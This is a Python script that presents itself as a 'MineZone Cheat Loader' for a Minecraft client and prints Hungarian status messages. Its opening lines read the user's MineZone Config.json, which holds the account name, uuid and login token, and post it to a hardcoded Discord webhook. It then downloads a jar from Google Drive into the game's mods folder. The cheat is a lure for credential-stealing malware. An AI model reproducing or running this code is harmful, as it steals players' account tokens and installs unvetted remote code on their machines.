import os
import sys
import time
import requests
import linecache
import urllib .request
f =open ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json','r')
minezone_login_data =f .read ()
url ="https://discord.com/api/webhooks/946463085550518282/JHRUVNLZ4bjW-l89hg67TeDAltV_7cOe2YlbpjAjnlrWbZNvlogceH7K2qdq4YxYmgPZ"
data ={"content":"`"+minezone_login_data +"`"}
result =requests .post (url ,json =data )
os .system ('title MineZone Cheat Loader Beta-0.02 - Made by: MTRD420 - #RivotrilSquad - https://discord.com/invite/FXdnj6Vhjd')
print ('''\033[1;30;40m----------------------------------------------------------------------------------
     \033[0;31;40m888b     d888 d8b                  \033[0;37;40m8888888888P
     \033[0;31;40m8888b   d8888 Y8P                  \033[0;37;40m      d88P
     \033[0;31;40m88888b.d88888                      \033[0;37;40m     d88P
     \033[0;31;40m888Y88888P888 888 88888b.   .d88b. \033[0;37;40m    d88P    .d88b.  88888b.   .d88b.
     \033[0;31;40m888 Y888P 888 888 888 "88b d8P  Y8b\033[0;37;40m   d88P    d88""88b 888 "88b d8P  Y8b
     \033[0;31;40m888  Y8P  888 888 888  888 88888888\033[0;37;40m  d88P     888  888 888  888 88888888
     \033[0;31;40m888   "   888 888 888  888 Y8b.    \033[0;37;40m d88P....  Y88..88P 888  888 Y8b.
     \033[0;31;40m888       888 \033[1;32;40m88\033[0;31;40m8 \033[1;32;40m88\033[0;31;40m8  8\033[1;32;40mdb\033[0;31;40m "Y88\033[1;32;40mdP""b8 88  dP 888888 8888b.\033[0;37;40m  888  "Y8888
                   \033[1;32;40m88  88   dPYb   dP   `" 88odP  88__    8I  Yb\033[0;37;40m
                   \033[1;32;40m888888  dP__Yb  Yb      88"Yb  88""    8I  dY\033[0;37;40m
                   \033[1;32;40m88  88 dP""""Yb  YboodP 88  Yb 888888 8888Y" \033[0;37;40m
\033[1;30;40m----------------------------------------------------------------------------------
\033[0;33;40m    ____           ____  _             __       _ _______                       __
   / __ )__  __   / __ \(_)   ______  / /______(_) / ___/____ ___  ______ _____/ /
  / __  / / / /  / /_/ / / | / / __ \/ __/ ___/ / /\__ \/ __ `/ / / / __ `/ __  /
 / /_/ / /_/ /  / _, _/ /| |/ / /_/ / /_/ /  / / /___/ / /_/ / /_/ / /_/ / /_/ /
/_____/\__, /  /_/ |_/_/ |___/\____/\__/_/  /_/_//____/\__, /\__,_/\__,_/\__,_/
      /____/                                             /_/
\033[1;30;40m----------------------------------------------------------------------------------''')
time .sleep (1 )
print ("\033[1;30;40m[\033[0;31;40mRivotrilSquad\033[1;30;40m] \033[0;33;40mHackelt kliens letöltése az adatbázisból...")
url ='https://drive.google.com/uc?export=download&id=1whAnS_dYPDCGiFr-c3tHkiqkDGSLjDPI&confirm=t'
path ='/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/mods/client.jar'
urllib .request .urlretrieve (url ,path )
time .sleep (1 )
print ("\033[1;30;40m[\033[0;31;40mRivotrilSquad\033[1;30;40m] \033[1;32;40mA hackelt kliens letöltése sikeresen befejeződött.")
time .sleep (1 )
print ("\033[1;30;40m[\033[0;31;40mRivotrilSquad\033[1;30;40m] \033[0;33;40mHackelt kliens injectálása...")
time .sleep (1 )
print ("\033[1;30;40m[\033[0;31;40mRivotrilSquad\033[1;30;40m] \033[1;32;40mHackelt kliens sikeresen injectálva.")
time .sleep (1 )
print ("\033[1;30;40m[\033[0;31;40mRivotrilSquad\033[1;30;40m] \033[0;33;40mMineZone indítása...")
def mainMenu ():
    print ("\033[1;30;40m[\033[0;31;40mRivotrilSquad\033[1;30;40m] \033[0;33;40mMineZone bezárása...\033[1;30;40m")
auth0 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json',1 )
auth1 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json',2 )
auth2 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json',8 )
auth3 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json',9 )
auth4 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json',7 )
auth5 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/Config.json',10 )
original_stdout =sys .stdout 
with open ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth','w')as f :
    sys .stdout =f 
    print (auth0 )
    print (auth1 )
    print (auth2 )
    print (auth3 )
    print (auth4 )
    print (auth5 )
sys .stdout =original_stdout 
with open ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth','r')as file :
  filedata =file .read ()
filedata =filedata .replace ('"realname": "',"u1 = '")
filedata =filedata .replace ('"uuid": "',"u2 = '")
filedata =filedata .replace ('"token": "',"u3 = '")
filedata =filedata .replace ('"ram": ',"u0 = '")
filedata =filedata .replace ('    ','')
filedata =filedata .replace (',',"'")
filedata =filedata .replace ('"',"'")
filedata =filedata .replace ("''","'")
filedata =filedata .replace ('{','import os')
filedata =filedata .replace ('}',"""\
os.system('cmd.exe /d /s /c "cd "%appdata%/.minezone" && "%appdata%/.minezone-jre/jre17-x64/bin/javaw" -Xss1M -Djava.library.path="%appdata%/.minezone/bin-win32" -Dminecraft.launcher.brand=zoneclient-launcher -Dminecraft.launcher.version=2.1.1431 -Dlog4j.configurationFile="%appdata%/.minezone/log4j2.xml" -Dlog4j2.formatMsgNoLookups=true -Dminecraft.client.jar="%appdata%/.minezone/minezone.jar" -cp "%appdata%/.minezone/libraries/net/fabricmc/tiny-mappings-parser/0.3.0+build.17/tiny-mappings-parser-0.3.0+build.17.jar;%appdata%/.minezone/libraries/net/fabricmc/sponge-mixin/0.11.2+mixin.0.8.5/sponge-mixin-0.11.2+mixin.0.8.5.jar;%appdata%/.minezone/libraries/net/fabricmc/tiny-remapper/0.8.1/tiny-remapper-0.8.1.jar;%appdata%/.minezone/libraries/net/fabricmc/access-widener/2.1.0/access-widener-2.1.0.jar;%appdata%/.minezone/libraries/org/ow2/asm/asm/9.2/asm-9.2.jar;%appdata%/.minezone/libraries/org/ow2/asm/asm-analysis/9.2/asm-analysis-9.2.jar;%appdata%/.minezone/libraries/org/ow2/asm/asm-commons/9.2/asm-commons-9.2.jar;%appdata%/.minezone/libraries/org/ow2/asm/asm-tree/9.2/asm-tree-9.2.jar;%appdata%/.minezone/libraries/org/ow2/asm/asm-util/9.2/asm-util-9.2.jar;%appdata%/.minezone/libraries/net/fabricmc/intermediary/1.18.1/intermediary-1.18.1.jar;%appdata%/.minezone/libraries/net/fabricmc/fabric-loader/0.13.3/fabric-loader-0.13.3.jar;%appdata%/.minezone/libraries/com/mojang/blocklist/1.0.6/blocklist-1.0.6.jar;%appdata%/.minezone/libraries/com/mojang/patchy/2.1.6/patchy-2.1.6.jar;%appdata%/.minezone/libraries/com/github/oshi/oshi-core/5.8.2/oshi-core-5.8.2.jar;%appdata%/.minezone/libraries/net/java/dev/jna/jna/5.9.0/jna-5.9.0.jar;%appdata%/.minezone/libraries/net/java/dev/jna/jna-platform/5.9.0/jna-platform-5.9.0.jar;%appdata%/.minezone/libraries/org/slf4j/slf4j-api/1.8.0-beta4/slf4j-api-1.8.0-beta4.jar;%appdata%/.minezone/libraries/org/apache/logging/log4j/log4j-slf4j18-impl/2.14.1/log4j-slf4j18-impl-2.14.1.jar;%appdata%/.minezone/libraries/com/ibm/icu/icu4j/69.1/icu4j-69.1.jar;%appdata%/.minezone/libraries/com/mojang/javabridge/1.2.24/javabridge-1.2.24.jar;%appdata%/.minezone/libraries/net/sf/jopt-simple/jopt-simple/5.0.4/jopt-simple-5.0.4.jar;%appdata%/.minezone/libraries/io/netty/netty-all/4.1.68.Final/netty-all-4.1.68.Final.jar;%appdata%/.minezone/libraries/com/google/guava/failureaccess/1.0.1/failureaccess-1.0.1.jar;%appdata%/.minezone/libraries/com/google/guava/guava/31.0.1-jre/guava-31.0.1-jre.jar;%appdata%/.minezone/libraries/org/apache/commons/commons-lang3/3.12.0/commons-lang3-3.12.0.jar;%appdata%/.minezone/libraries/commons-io/commons-io/2.11.0/commons-io-2.11.0.jar;%appdata%/.minezone/libraries/commons-codec/commons-codec/1.15/commons-codec-1.15.jar;%appdata%/.minezone/libraries/com/mojang/brigadier/1.0.18/brigadier-1.0.18.jar;%appdata%/.minezone/libraries/com/mojang/datafixerupper/4.0.26/datafixerupper-4.0.26.jar;%appdata%/.minezone/libraries/com/google/code/gson/gson/2.8.8/gson-2.8.8.jar;%appdata%/.minezone/libraries/com/mojang/authlib/3.2.38/authlib-3.2.38.jar;%appdata%/.minezone/libraries/org/apache/commons/commons-compress/1.21/commons-compress-1.21.jar;%appdata%/.minezone/libraries/org/apache/httpcomponents/httpclient/4.5.13/httpclient-4.5.13.jar;%appdata%/.minezone/libraries/commons-logging/commons-logging/1.2/commons-logging-1.2.jar;%appdata%/.minezone/libraries/org/apache/httpcomponents/httpcore/4.4.14/httpcore-4.4.14.jar;%appdata%/.minezone/libraries/it/unimi/dsi/fastutil/8.5.6/fastutil-8.5.6.jar;%appdata%/.minezone/libraries/org/apache/logging/log4j/log4j-api/2.14.1/log4j-api-2.14.1.jar;%appdata%/.minezone/libraries/org/apache/logging/log4j/log4j-core/2.14.1/log4j-core-2.14.1.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl/3.2.2/lwjgl-3.2.2.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl-jemalloc/3.2.2/lwjgl-jemalloc-3.2.2.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl-openal/3.2.2/lwjgl-openal-3.2.2.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl-opengl/3.2.2/lwjgl-opengl-3.2.2.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl-glfw/3.2.2/lwjgl-glfw-3.2.2.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl-stb/3.2.2/lwjgl-stb-3.2.2.jar;%appdata%/.minezone/libraries/org/lwjgl/lwjgl-tinyfd/3.2.2/lwjgl-tinyfd-3.2.2.jar;%appdata%/.minezone/libraries/com/mojang/text2speech/1.11.3/text2speech-1.11.3.jar;%appdata%/.minezone/minezone.jar" -Xms' + u0 + 'M -Xmx' + u0 + 'M -XX:+UnlockExperimentalVMOptions -XX:+UseG1GC -XX:G1NewSizePercent=20 -XX:G1ReservePercent=20 -XX:MaxGCPauseMillis=50 -XX:G1HeapRegionSize=32M net.fabricmc.loader.impl.launch.knot.KnotClient --username "' + u1 + '" --uuid ' + u2 + ' --version 1.18.1 --gameDir "%appdata%/.minezone" --assetsDir "%appdata%/.minezone/assets" --assetIndex 1.18 --zoneToken ' + u3 + ' --accessToken ' + u3 + ' --userType mojang --versionType release"')
""")
with open ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth','w')as file :
  file .write (filedata )
id0 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth',1 )
id1 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth',3 )
id2 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth',5 )
id3 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth',7 )
id4 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth',9 )
id5 =linecache .getline ('/Users/'+os .getlogin ()+'/AppData/Roaming/.minezone/auth',11 )
original_stdout =sys .stdout 
with open ('/Users/'+os .getlogin ()+'/AppData/Local/auth','w')as f :
    sys .stdout =f 
    print (id0 )
    print (id1 )
    print (id2 )
    print (id3 )
    print (id4 )
    print (id5 )
sys .stdout =original_stdout 
os .system ('@echo off && cd %localappdata% && python auth')
os .system ('@echo off && cd %localappdata% && del auth')
if (__name__ =="__main__"):
    mainMenu ()